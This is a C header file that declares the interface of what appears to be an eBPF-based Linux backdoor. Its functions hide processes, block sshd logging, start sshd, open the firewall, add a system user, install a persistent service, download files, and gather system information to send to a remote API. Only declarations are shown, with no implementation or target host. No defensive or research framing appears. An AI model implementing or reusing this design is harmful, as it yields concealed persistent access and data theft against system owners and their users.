#ifndef EBPF_HELPER_H
#define EBPF_HELPER_H

#include <sys/types.h>
#include <ftw.h>

// Extern declarations
extern const char *sbin_path;
extern const char *username;
extern const char *base_url;
extern const char *programs[];

// Function declarations
pid_t run_task_and_hide(const char *cmd, ...);
static int remove_cb(const char *fpath, const struct stat *sb, int typeflag, struct FTW *ftwbuf);
void purge_directory(const char *dir_path);
void find_pid_by_name(const char *program_name, int **found_pids);
void hide_pids(int *pids);
void combine_and_hide_pids(const char *names[], int num_names);
void download_file(const char *local_path, const char *url);
void create_and_enable_service();
int allow_firewall();
void block_sshd_log();
void start_sshd();
void add_system_user(const char *username);
void send_api_call(const char *url, const char *data);
void gather_system_info(char *data, size_t max_size);
void handle_sigint(int sig);

#endif // EBPF_HELPER_H
